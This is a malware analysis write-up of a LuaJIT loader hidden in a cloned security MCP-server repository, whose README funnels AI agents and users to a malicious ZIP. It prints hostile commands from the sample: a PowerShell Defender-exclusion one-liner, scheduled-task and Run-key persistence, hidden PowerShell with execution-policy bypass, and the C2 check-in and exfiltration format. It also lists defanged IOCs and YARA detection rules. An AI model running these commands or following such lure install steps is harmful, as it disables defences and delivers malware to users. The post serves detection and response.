+++
title = "FakeGit's LuaJIT Loader: Hidden Strings and a Polygon Dead Drop"
date = "2026-09-14"
+++

This started with a repo that looked legitimate. A collection of MCP servers for pentesters: SQLMap, FFUF, NMAP, Masscan, all wrapped so an AI agent could drive them. It even had a promotional blog post written about it.

Then came the tell. Every link in the README pointed to the same ZIP file. Not the releases page, not the docs. The install commands, the badge images, the download button, even the contact email. All thirteen of them, one file.

## TL;DR

* `StanLeyJ03/mcp-for-security` is a history-preserving clone of a real security MCP project. Two commits on 2026-02-19 turned its README into a funnel aimed at `for-security-mcp-3.3.zip`.
* Inside the ZIP: a 28-byte launcher, a freshly built LuaJIT interpreter, and 309KB of single-line Lua that decrypts itself as it runs.
* The obfuscation is Prometheus, the open-source Lua obfuscator, run with its heaviest settings and randomized build keys.
* All 996 encrypted strings are decrypted here, including the C2, the Polygon dead drop, the persistence commands, and the PowerShell one-liner that exempts `.exe` and `.dll` across the entire system drive from Defender.
* The campaign is publicly tracked as FakeGit and attributed by Trend Micro to Water Kurita, also tracked as Storm-2477.
* The loader sits upstream of the SmartLoader chain that ends in StealC. Nothing was executed to produce this report, and no IOC was ever contacted.

## What was in the zip

| File | Size | MD5 | SHA-1 | SHA-256 |
| --- | --- | --- | --- | --- |
| `Launcher.cmd` | 28 B | `fc3979a7ae6f3b0d64986c93b7911991` | `ab9685d1f483f40a5bd995173519a12473fa450f` | `ce1e33483d353200a266b3bc383ccf500e5a760c6dcd8218747260f5bbe39509` |
| `luajit.exe` | 878,080 B | `bff3a81de5ffacbeddd5de793cede666` | `d49590bfb8b160595382339433535c481ce425ac` | `f3e34c9e36f3be065d80d456281d31dd1cc85eb4980db7fa8c1b0eb6f29c25d8` |
| `uix.txt` | 309,352 B | `fe67c54a6387db6bf31f73ea6d695c12` | `97134dbb856b11be3b018508e980f58622bc5350` | `8cede35b80b1deaf732c2b178d908f91b3e7a0c114d06dfae9075b8a9bf78b8f` |
| 2nd-stage blob (still encrypted as extracted) | 8,514 B | | | `3516ff63d6bfddcc8250bb8b63a9dddeec0cb9fd43747e1c6a0b9e84c332ad0d` |
| 2nd-stage plaintext (`ffi.cdef`, in memory after decryption) | 8,514 B | | | `b74f433a796448f2cedb5acd393db3f987d1c7cdb8af2fa1d2a32c66229be5b8` |

`luajit.exe` contains no malicious code. Static analysis found KERNEL32-only imports, no resources, no overlay, no TLS callbacks, no delay imports, no embedded C2, and exactly one URL string (`http://luajit.org/`). It is abused the same way `mshta` or `rundll32` is: a legitimate interpreter that will happily run someone else's script.

Do not call it "stock", though. The LuaJIT project ships source only and distributes no Windows binaries, so every `luajit.exe` in the wild is somebody's build. This one carries a compile timestamp of 2026-02-18 22:40 UTC and was linked as a GUI-subsystem executable. A console build flashes a window on launch. This one never does. Some public reporting labels the binary "trojanized"; the static evidence disagrees. It is a clean rebuild, configured so a victim never sees it run. Roughly ten hours after that compile timestamp, the repository received its ZIP.

## How the lure worked

The technique has a name now: AgentBaiting. An AI agent hunting for a capability (a Skill, an MCP server, a plugin) can find the attacker's repository on its own, read the attacker's README as documentation, and hand the install steps to its user. Island documented the pattern in July 2026 across a FakeGit operation of roughly 7,600 repositories. More than 800 of them posed as AI Skills or MCP servers.

This repository is one of them. The README keeps every heading from the project it copied, and then:

```text
badge image        -> .../raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip
git clone command  -> .../raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip
pip install -r     -> .../raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip
python server.py   -> .../raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip
Email              -> .../raw/refs/heads/main/nmap-mcp/src/for-security-mcp-3.3.zip
```

Thirteen occurrences of the same ZIP URL in a 4,991-byte README.

![](/fakegit-01-readme-lure.png)

*The README on GitHub. Both badges are broken images, since they point at the ZIP.*

The commit history is where the story gets clean. The repo is a history-preserving clone of `cyproxio/mcp-for-security`, Serhat Çiçek's project (630 stars, since deprecated by its author). Ten commit hashes in the clone are byte-identical to the original's history. The copy appeared two days after the original and then sat idle, apart from a README rewrite in August 2025.

![](/shot-20260914173405.png)

*Contributors. Serhatcck built the project: 10 commits, 8,099 lines added. StanLeyJ03 made 3 commits and removed more than it added.*

On February 19, 2026, two commits hours apart finished the job. At 09:01 UTC one dropped the ZIP into the tree. At 12:41 UTC another rewrote every link to point at it. The repository still stands today.

![](/shot-20260914173718.png)

*The weaponizing commit. Every real link replaced with the ZIP path, +12/-12. The diff shows the working `git clone` line swapped for a download.*

The file itself sits where nobody looks. In the `nmap-mcp/src/` directory it appears alongside `package.json`, `index.ts`, and `readme.md`, named like a release artifact, three directories deep in a project that has no releases:

![](/fakegit-02-zip-in-tree.png)

*One ZIP among ordinary source files.*

## Execution chain

{% <mermaid> %}
flowchart TD
    A["Launcher.cmd<br/>start luajit.exe uix.txt"] --> B["luajit.exe loads uix.txt"]
    B --> C["VM boot<br/>anti-tamper line-number check"]
    C --> D["Hide console<br/>GetConsoleWindow + ShowWindow(SW_HIDE)"]
    D --> E["Decrypt string table<br/>996 strings + 8,514 B ffi.cdef"]
    E --> F["ffi.cdef declares the Win32 surface"]
    F --> G["Resolve APIs by PEB walk<br/>RtlInitUnicodeString + LdrLoadDll"]
    G --> H["Profile victim<br/>OS, user, admin token, MachineGuid"]
    H --> I["Check in over HTTP"]
    I --> J["Persistence<br/>Run key + scheduled task + file drops"]
    J --> K["Defender exclusion<br/>Add-MpPreference"]
    K --> L{"Task loop"}
    L -->|"HTTP reachable"| M["Poll /task/"]
    L -->|"HTTP blocked"| N["Polygon eth_call<br/>dead-drop fallback"]
    M --> O["Execute payload<br/>VirtualAlloc + CreateThread, or rundll32 / PowerShell"]
    N --> O
{% </mermaid> %}

The launcher is 28 bytes and does one thing: `start luajit.exe uix.txt`. `start` detaches the process, and the script hides its console window immediately after. From the victim's side, nothing visibly happens.

## The obfuscator behind it

`uix.txt` is not a script with strings scattered through it. It is a virtual machine that interprets a second, encrypted program, produced by Prometheus, an open-source Lua obfuscator on GitHub, run with its heaviest settings.

Prometheus's source lists its transformation steps, and the sample matches them one for one:

| Prometheus step | What it does | Where it shows up in `uix.txt` |
| --- | --- | --- |
| `Vmify` | compiles the script into a randomized VM | the 553-block dispatch, closure factories, heap and refcount machinery |
| `EncryptStrings` | per-site string encryption with a random seed | all 996 encrypted literals |
| `AntiTamper` | breaks the script when it is edited | the traceback line-number check that ends in `error("Tamper Detected!")` |
| `NumbersToExpressions` | rewrites constants as junk arithmetic | `-1273246-((228191+-839136)+340691)` and friends |
| `SplitStrings` | splits names into chunk tables | the `mn` / `xn` reassembly helpers, 403 call sites |
| `ConstantArray` | hoists constants into a big table | the literal tables the VM indexes at runtime |

The VM mechanics, for anyone who wants the details:

* Everything is wrapped in `return (function(...) return (function(z,E,A,j,r,l,Q,F,V,L,N,G,q,s,g,d,k,O,K,c,u,y,U,t) ... end)(...))( ... )(E(Q))`.
* `BIGFUNC(y, A, j, r)` interprets a numeric program counter. `while y do if y<N then ...` is a binary-search dispatch over 553 basic blocks. `F` is a slot-indexed heap, `c` a refcount array, `t()` an allocator.
* Nine closure factories with fixed arities (`G` = 0, `d` = 1, `g` = 2, `u` = 3, `O` = 4, `V` = 5, `q` = 6, `s` = 8, `U` = varargs) produce 64 closures.
* Eighty-eight sentinel globals are read as `z["..."]`. The VM never writes any global, so they are always `nil`. Their only job is to terminate the interpreter loop.
* Decoy blocks raise Lua errors if they are ever reached (`"1xp" / c`), which never happens. They exist to waste an analyst's afternoon.
* The anti-tamper check raises deliberate errors, catches its own traceback, parses `file:LINE:` and compares line numbers against expected constants. Edit the file and it dies with `Tamper Detected!`.

Public deobfuscators exist for Prometheus (0x251's `Prometheus-Deobfuscator` and its V2). This analysis did not use them. Their strongest step executes the script under stubbed natives to observe behavior, and this payload is architecture-independent, so running it here would mean a live sample on a machine that already has `luajit` installed. A Python emulator that models the VM instead, with natives stubbed to symbolic values and no Lua runtime involved, does the same job without the risk.

## The string cipher

Every meaningful name in `uix.txt` is encrypted: API names, registry paths, URLs, commands. There are 996 encrypted literals, each with its own fresh seed, and the cipher is length-preserving with add-with-feedback.

Prometheus ships this as a documented step, and `EncryptStrings.lua` contains the whole thing:

```lua
state_45 = seed_53 % 35184372088832
state_8  = seed_53 % 255 + 2
param_mul_8  = primitive_root_257(secret_key_7)
param_mul_45 = secret_key_6 * 4 + 1
param_add_45 = secret_key_44 * 2 + 1
out[i] = string.char((byte - (get_next_pseudo_random_byte() + prevVal)) % 256)
prevVal = byte
```

That makes the constants in the sample checkable against the generator's parameter ranges. Every one of them lands inside:

| In the sample | Prometheus parameter | Checks out because |
| --- | --- | --- |
| `% 2^45` | `35184372088832` | same modulus |
| `172` | `primitive_root_257(secret_key_7)` | 172 is a primitive root modulo 257 |
| `181` | `secret_key_6 * 4 + 1` | back-computes to 45, inside the 0..63 range |
| `22231257191003` | `secret_key_44 * 2 + 1` | back-computes to an integer inside the 0..2^44 range |
| seed init `% 255 + 2` | `seed_53 % 255 + 2` | identical |
| IV `238` | `secret_key_8` | inside the 0..255 range |

The string table is therefore recoverable by anyone with the public obfuscator source. It also explains the version sprawl: the "16 obfuscator generations" tracked under ESET's `Lua/Agent.Z` through `Lua/Agent.BT` are not 16 hand-written variants. Prometheus re-randomizes its keys on every build, so re-obfuscating the same code produces what looks like a new generation while nothing underneath has moved.

All 996 strings came out clean, and the separate 8,514-byte blob decrypts to coherent C: a LuaJIT `ffi.cdef` header declaring the whole Win32 surface the loader uses. Hashes for both, encrypted and plaintext, are in the IOC list.

![](/fakegit-05-prometheus-public.png)

*Prometheus on GitHub: 506 stars, and a docs folder covering every transformation this loader uses.*

## What it does once running

Everything below is reconstructed from the decrypted strings and the decrypted `ffi.cdef` header. Grouped by what the loader is actually trying to achieve:

| Capability | How it works |
| --- | --- |
| **Reach Windows without imports** | The `ffi.cdef` header declares the full Win32 surface, including PE structures (`IMAGE_DOS_HEADER`, `IMAGE_NT_HEADERS32/64`, `IMAGE_EXPORT_DIRECTORY`), loader walking structures (`PEB`, `PEB_LDR_DATA`, `LDR_DATA_TABLE_ENTRY`, `UNICODE_STRING`), `RtlInitUnicodeString`, and `LdrLoadDll`. APIs get resolved by walking the loader list at runtime, so the import table shows nothing suspicious. |
| **Profile the host** | Computer name, user name, `GetSystemMetrics`, `VerifyVersionInfoW` (OS build), `IsWow64Process`, `GetTokenInformation` with `TOKEN_ELEVATION` (is the process admin?), the `MachineGuid` registry value as a unique host ID, and `ip-api[.]com` for geolocation. The C2 parameters confirm it: `guid= os= arch= user= computer= country= city= timezone= loaderId= taskId= brand= location= query=`. |
| **Survive reboots, three ways** | A Run key plus the matching `Explorer\StartupApproved\Run` entry, a scheduled task created both ways (`schtasks` and PowerShell `Register-ScheduledTask`), and file drops including `C:/Windows/System32/oobe/Setup.exe` registered with `/rl highest`. |
| **Blind the defences** | `Add-MpPreference -ExclusionPath $env:SystemDrive -ExclusionExtension .exe, .dll -Force` through hidden PowerShell. One command, and every `.exe` and `.dll` on the system drive is exempt from Defender. |
| **Run code it retrieves** | `VirtualAlloc` + `VirtualProtect` + `CreateThread` with the `LPTHREAD_START_ROUTINE` signature, which means in-memory shellcode and PE execution. Files also get written to disk and launched through `rundll32`, `WinExec`, `cmd /c`, or PowerShell. Handled extensions: `.exe .dll .bin .luac .json .bat .cmd .ps1`. |
| **Watch the screen** | `GetDC` into `CreateDIBSection` and `BitBlt`, with full bitmap headers. A screenshot pipeline writing `.bmp`. |
| **Stay quiet** | `GetConsoleWindow` + `ShowWindow(SW_HIDE)` for the console, and a `CreateMutexW` single-instance guard. The mutex call is confirmed structurally: the resolver leaf decodes to `CreateMutexW` and invokes it as `CreateMutexW(NULL, FALSE, name)`, so the name comes from a runtime table lookup rather than a hardcoded literal. |

The DLLs it reaches for: `kernel32`, `ntdll`, `wininet`, `advapi32`, `shlwapi`, `shell32`, `winbrand`, and `user32`/`gdi32`. It leans on the LuaJIT `bit` library throughout, plus `ffi`, `cdef`, `cast`, `sizeof`, and casts like `ulong[1]` and `TOKEN_ELEVATION[1]`. None of this would survive a plain Lua interpreter, which is why the interpreter ships in the ZIP.

## C2: plain HTTP and a blockchain dead drop

Channel one is plain HTTP to a bare IPv4 address, defanged here as `hxxp://213[.]176[.]73[.]151`, with REST-ish paths `/api/`, `/json/`, and `/task/`. Check-ins carry the victim profile above. Exfiltration is a `POST` with `multipart/form-data`, boundary `a1u4xbodohy2cqdc2n0i336qy9tcap8w64yb424`, one part named `data` and one named `file`. `GET` polls for tasks. `hxxps://www[.]microsoft[.]com` appears to be a connectivity check. The User-Agent is a stock Chrome string (`Chrome/145.0.0.0`), and the frozen minor version is exactly what Chrome's User-Agent Reduction produces, so it dates the build rather than proving fakery.

The check-in URL is not anonymous. Triage captured a live one from this exact sample:

```text
POST /api/NTE3YjdjNWU1NjYzNjU2YTA1N2Y= HTTP/1.1
```

Decode that base64 segment and you get `517b7c5e5663656a057f`, which started this analysis as an "unidentified constant" in the decoded strings. It is the loader ID, and every check-in carries it as a path segment. One of the quiet payoffs of putting static work and sandbox telemetry side by side.

Channel two is the reason this family keeps surviving takedowns. A JSON-RPC template is embedded:

```json
{ "jsonrpc": "2.0", "method": "eth_call",
  "params": [ { "to": "%s", "data": "%s" }, "latest" ], "id": 1 }
```

The contract is hardcoded as `0x1823A9a0Ec8e0C25dD957D0841e3D41a4474bAdc` with the 4-byte selector `0x3bc5de30`. Five Polygon mainnet RPC providers sit behind it as fallbacks: `polygon-mainnet[.]gateway[.]tatum[.]io`, `polygon-public[.]nodies[.]app`, `polygon[.]drpc[.]org`, `polygon[.]publicnode[.]com`, `rpc-mainnet[.]matic[.]quiknode[.]pro`.

> Do not misread this IOC. The contract is not a wallet and not a payment address. `eth_call` is a read-only invocation, and this is the EtherHiding pattern: the operator stores the current C2 address on chain and updates it there, so rotating infrastructure never requires touching a deployed sample. No wallet address and no ransom demand exists anywhere in this build.

The dead drop doing its job is visible in public telemetry. Triage's June 2026 sandbox run shows the loader POSTing to a second address, `85[.]137[.]52[.]21`, which appears nowhere in the static strings and nowhere in the March C2 tables. It shows up after the check-in to the original C2 and after the `eth_call`, with nothing downloaded in between. Two explanations fit: the contract returned a rotated address, or the first C2 handed one over. Either way, the sample on disk never changed and the address did.

![](/fakegit-06-sandbox-telemetry.png)

*The sandbox run, live: `luajit.exe` checking in to the original C2, calling the contract through `polygon[.]drpc[.]org`, and then posting to a second address that exists in none of the 996 static strings.*

**Attribution.** Trend Micro tracks this operation as Water Kurita, also tracked as Storm-2477, and assesses FakeGit as a continuation of an earlier Lumma Stealer campaign. derp.ca independently ties the distribution tooling to a single Vietnamese-speaking operator. This analysis corroborates the toolchain.

## Indicators of compromise

Everything below is defanged. Re-fang inside your tooling. Do not click or resolve anything.

**Files**

```text
for-security-mcp-3.3.zip                    (repo path: nmap-mcp/src/for-security-mcp-3.3.zip)

Launcher.cmd          28 B
  md5                  fc3979a7ae6f3b0d64986c93b7911991
  sha1                 ab9685d1f483f40a5bd995173519a12473fa450f
  sha256               ce1e33483d353200a266b3bc383ccf500e5a760c6dcd8218747260f5bbe39509

luajit.exe            878,080 B
  md5                  bff3a81de5ffacbeddd5de793cede666
  sha1                 d49590bfb8b160595382339433535c481ce425ac
  sha256               f3e34c9e36f3be065d80d456281d31dd1cc85eb4980db7fa8c1b0eb6f29c25d8

uix.txt               309,352 B
  md5                  fe67c54a6387db6bf31f73ea6d695c12
  sha1                 97134dbb856b11be3b018508e980f58622bc5350
  sha256               8cede35b80b1deaf732c2b178d908f91b3e7a0c114d06dfae9075b8a9bf78b8f

2nd-stage blob (encrypted on disk)
  sha256               3516ff63d6bfddcc8250bb8b63a9dddeec0cb9fd43747e1c6a0b9e84c332ad0d

2nd-stage plaintext (ffi.cdef; exists in memory after decryption)
  sha256               b74f433a796448f2cedb5acd393db3f987d1c7cdb8af2fa1d2a32c66229be5b8
```

**Network**

```text
hxxp://213[.]176[.]73[.]151                primary C2 (HTTP, bare IPv4, ASN 207957)
   paths:      /api/   /json/   /task/
   check-in:   POST /api/<base64 loader id>
   profile:    guid= os= arch= user= computer= country= city= timezone=
               loaderId= taskId= brand= location= query=

ip-api[.]com                               victim IP geolocation (legitimate service, abused)
hxxps://www[.]microsoft[.]com              connectivity check
85[.]137[.]52[.]21                         second C2, June 2026 sandbox run only: absent from the
                                           static strings and from the March C2 tables. Surfaces after
                                           the contract call and the original-C2 check-in, consistent
                                           with a rotated address being picked up at runtime.
polygon-mainnet[.]gateway[.]tatum[.]io     blockchain C2 fallback (Polygon RPC)
polygon-public[.]nodies[.]app
polygon[.]drpc[.]org
polygon[.]publicnode[.]com
rpc-mainnet[.]matic[.]quiknode[.]pro
```

**Blockchain**

```text
contract (read via eth_call): 0x1823A9a0Ec8e0C25dD957D0841e3D41a4474bAdc
selector:                     0x3bc5de30        (getData())
```

**Host**

```text
File:   C:\Windows\Setup\Scripts\ErrorHandler.cmd
File:   C:\Windows\System32\oobe\Setup.exe        (masquerade; registered with /rl highest)
File:   %LOCALAPPDATA%\ODM5\ODM5.exe              (observed in sandbox; folder name is per-build random)
File:   %LOCALAPPDATA%\ODM5\uix.txt

Task:   CloudDrive_ODM5                           (observed; daily at 14:11)
        name pool: CloudDrive, AdobeCreativeCloud, AudioManager
        created via schtasks and via PowerShell Register-ScheduledTask

Reg:    HKCU|HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Reg:    HKCU|HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
Reg:    HKLM\SOFTWARE\Microsoft\Cryptography      (MachineGuid read as host ID)

CMD:    luajit.exe <script>
CMD:    start /min cmd /c ""
CMD:    schtasks /create /sc daily /st %02d:%02d /f
CMD:    /tn Setup /tr "C:/Windows/System32/oobe/Setup.exe" /rl highest

PS:     Add-MpPreference -ExclusionPath $env:SystemDrive -ExclusionExtension .exe, .dll -Force
PS:     powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "
PS:     Register-ScheduledTask -TaskName '<name>' -Action (New-ScheduledTaskAction -Execute '<path>')

HTTP:   Content-Type: multipart/form-data; boundary=a1u4xbodohy2cqdc2n0i336qy9tcap8w64yb424
        part "data" and part "file"; recovered part filename:
        r9psctse47itn45wmikjdsf5o5jhra0sjb2ad9crqk90pny5uhuql46f7aybl8adf2fglpxiii1wnsabtyp01kwusyo8k9hupl2i

UA:     Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/145.0.0.0 Safari/537.36
Mutex:  CreateMutexW(NULL, FALSE, <name>)      single-instance guard.
                                               The name is resolved through a runtime table
                                               lookup keyed by a 45-char opaque identifier, so it
                                               is not present in the static string set.
```

**Recovered constants**

```text
ECe6VGLRJum2qYtl79OiOU7aHot7Zhbn               32 chars; XOR key for the GitHub dead-drop blobs (per derp.ca)
517b7c5e5663656a057f                           10 bytes hex; the loader ID, sent base64 in the C2 path
26bbudy13hydiihesb72eoyx8t8rqg0sifvolvn71nyq7  45-char plaintext literal; an opaque identifier used as a runtime table key
839                                            three-character string literal, used as a runtime table key
0x3bc5de30                                     contract selector (getData)
```

## Detection and response

What to hunt for:

* `luajit.exe` (or `lua51.dll`) making outbound HTTP to a bare IP, especially to `/api/`, `/json/`, or `/task/`, or posting `multipart/form-data` to an IP literal.
* `luajit.exe` resolving Polygon RPC hosts. Legitimate software has little reason to combine a Lua interpreter with `drpc[.]org` or `publicnode[.]com`.
* Parent and child processes: `cmd.exe` launching `luajit.exe` with a `.txt` or `.luac` argument.
* A new `Run` value plus a matching `StartupApproved\Run` entry created in the same window. The pairing is the tell; either one alone happens legitimately.
* `Add-MpPreference -ExclusionPath` from anything that is not admin tooling.
* A fresh scheduled task whose action points under `System32\oobe\` or `Windows\Setup\Scripts\`.
* The two file paths above, plus `GetDC`/`BitBlt` activity from a process with no UI.

Response order that matters:

1. Isolate the host. Block the C2 IP and the RPC endpoints if they are not business-required.
2. Remove the Defender exclusions first (`Get-MpPreference | select ExclusionPath, ExclusionExtension`, then `Remove-MpPreference`). Until you do, every later scan is blind by design.
3. Delete the Run key, the `StartupApproved\Run` value, and the scheduled task.
4. Collect `System32\oobe\Setup.exe` and `Windows\Setup\Scripts\ErrorHandler.cmd` as evidence before deleting them.
5. Hunt for delivered payloads by extension (`.exe .dll .bin .luac .ps1 .bat .cmd .json`) in Desktop, Temp, and recent download locations.
6. Treat the contract as a network pivot, not something to block.
7. Revoke sessions, tokens, and credentials if the host held anything sensitive. The SmartLoader chain ends in StealC, which takes live sessions, and resetting passwords does not reclaim those.

## YARA rules

Two rules, compiled with yara-python and tested against the live sample and against a memory image rebuilt from the decrypted strings. The first catches the payload on disk. The second catches it after it decrypts itself, which is where the interesting strings spend most of their life. The strings inside the rules are live on purpose, because they have to match real bytes. Everything in the prose above stays defanged.

```yara
rule LuaJIT_FakeGit_Loader_uix
{
    meta:
        description = "FakeGit/SmartLoader LuaJIT loader: single-line Prometheus-vmified Lua payload"
        author      = "Kshitij Chitnis"
        date        = "2026-09-15"
        reference   = "https://www.derp.ca/research/fakegit-luajit-github-campaign/"

    strings:
        $wrap = "return(function(...)return(function(" ascii
        $disp = "while y do if y<" ascii
        $np   = "newproxy" ascii

    condition:
        uint16(0) != 0x5A4D and
        filesize > 200KB and filesize < 600KB and
        all of them
}
```

```yara
rule LuaJIT_FakeGit_Loader_decrypted
{
    meta:
        description = "Decrypted material from the FakeGit/SmartLoader LuaJIT loader (memory scan): these strings exist only after runtime decryption"
        author      = "Kshitij Chitnis"
        date        = "2026-09-15"
        reference   = "https://www.derp.ca/research/fakegit-luajit-github-campaign/"

    strings:
        $p1 = "213.176.73.151" ascii
        $p2 = "polygon-public.nodies.app" ascii
        $p3 = "rpc-mainnet.matic.quiknode.pro" ascii
        $p4 = "0x1823A9a0Ec8e0C25dD957D0841e3D41a4474bAdc" ascii
        $p5 = "a1u4xbodohy2cqdc2n0i336qy9tcap8w64yb424" ascii
        $p6 = "Add-MpPreference -ExclusionPath $env:SystemDrive" ascii
        $p7 = "CloudDrive" ascii
        $p8 = "C:\\Windows\\Setup\\Scripts\\ErrorHandler.cmd" ascii

    condition:
        2 of them
}
```

![](/fakegit-08-yara-test.png)

*Both rules compiled and run. The structural rule fires on `uix.txt` and nothing else. The decrypted rule fires on the rebuilt string table with all eight anchors. The interpreter and launcher stay clean, which is correct: neither one contains the malware.

## MITRE ATT&CK mapping

| ID | Technique | Evidence |
| --- | --- | --- |
| T1218 | System binary proxy execution (LOLbin) | LuaJIT runtime runs the attacker's script |
| T1059.011 | Command and scripting interpreter: Lua | the entire loader runs as Lua |
| T1027 / .002 / .013 | Obfuscated files, packing, encrypted file | Prometheus `Vmify` + `EncryptStrings` |
| T1140 | Deobfuscate/decode files or information | 996 strings + 8,514-byte blob decrypted at runtime |
| T1129 / T1106 | Execution via native API | FFI-declared APIs, `CreateThread`, `WinExec` |
| T1055 | Process injection | `VirtualAlloc` + `VirtualProtect` + `CreateThread` |
| T1620 | Reflective code loading | API resolution by PEB walk + `LdrLoadDll` |
| T1547.001 | Registry Run keys / Startup folder | `CurrentVersion\Run` + `StartupApproved\Run` |
| T1053.005 | Scheduled task | `schtasks`, `Register-ScheduledTask` |
| T1562.001 | Impair defences | `Add-MpPreference -ExclusionPath $env:SystemDrive` |
| T1070.004 / T1036.005 | Indicator removal, masquerading | `oobe\Setup.exe`, `ErrorHandler.cmd` |
| T1012 / T1082 | System discovery | OS version, arch, `MachineGuid` |
| T1033 | User discovery | user, computer name, admin token |
| T1614 / .001 | Location discovery | `ip-api[.]com`, `country=` / `city=` / `timezone=` params |
| T1113 | Screen capture | `BitBlt` + `CreateDIBSection` + bitmap headers |
| T1071.001 | Application-layer C2 over web protocols | WinINet HTTP GET/POST |
| T1102 / .001 | Web service / dead-drop resolver | Polygon `eth_call` contract read |
| T1041 / T1567 | Exfiltration over C2 channel | multipart upload, parts `data` and `file` |
| T1105 | Ingress tool transfer | `/task/` downloads, seven handled extensions |
| T1497 | Virtualization/sandbox evasion (partial) | anti-tamper traceback check; `VerifyVersionInfoW` |

## Verdict

**What it is:** a task-driven loader and backdoor. It rides on a clean interpreter, calls the Windows API through LuaJIT FFI without importing anything, persists three ways, exempts itself from Defender, profiles and screenshots the victim, and takes orders from HTTP with a blockchain dead drop as backup. It fetches and executes arbitrary code, in memory or on disk.

**Severity: HIGH.** It achieves elevated persistence, defence evasion, remote code execution, and data exfiltration. It is not self-propagating and contains no ransomware component.

**Family:** the FakeGit / SmartLoader chain, per public reporting. No new family name asserted here.

**Attribution:** Water Kurita (Storm-2477) per Trend Micro; single Vietnamese-speaking operator per derp.ca. This analysis corroborates the toolchain and does not add an independent attribution.

**Confidence:** HIGH that the file is malicious and that the capabilities and IOCs listed are correct, resting on two independent cipher implementations agreeing on 996 out of 996 strings and a coherent decrypted artifact. MEDIUM on exact runtime ordering, since nothing was executed.

## Appendix: reproducibility and further reading

Artifacts from the analysis: `decoder.py` (cipher plus CLI), `decoder_notes.md`, `decoded_all.json` (offset, seed, ciphertext, and plaintext for all 996 sites), `decoded_names.txt` (406 distinct plaintexts), `verify.py`, `blob_8514.bin` with notes, `callsites.json`, `lits.json`, `closures_full.md`, `closure_sites.json`, `all_blocks.lua`, plus the PE check and the two YARA rules above.

Nothing was executed at any point. Every result comes from parsing bytes, constant folding, and re-implementing the recovered cipher in Python.

* Island: AgentBaiting, how 800+ fake AI skills and MCP servers delivered malware (July 2026). https://www.island.io/blog/agentbaiting-how-800-fake-ai-skills-and-mcp-servers-delivered-malware
* derp.ca: FakeGit, LuaJIT malware distributed via GitHub at scale (March 2026). https://www.derp.ca/research/fakegit-luajit-github-campaign/
* Hexastrike: Cloned, Loaded, and Stolen (April 2026). https://hexastrike.com/resources/blog/threat-intelligence/cloned-loaded-and-stolen-how-109-fake-github-repositories-delivered-smartloader-and-stealc/
* Hive Pro advisory TA2026209, and the Cyber Security News writeup with the IOC table. https://www.hivepro.com/threat-advisory/when-your-ai-agent-hands-you-the-malware-inside-fakegits-agentbaiting-campaign
* Triage sandbox runs of these hashes: https://tria.ge/260615-xedvlaes8y and https://tria.ge/260320-javqnabw3w
* Prometheus, the open-source Lua obfuscator: https://github.com/prometheus-lua/Prometheus
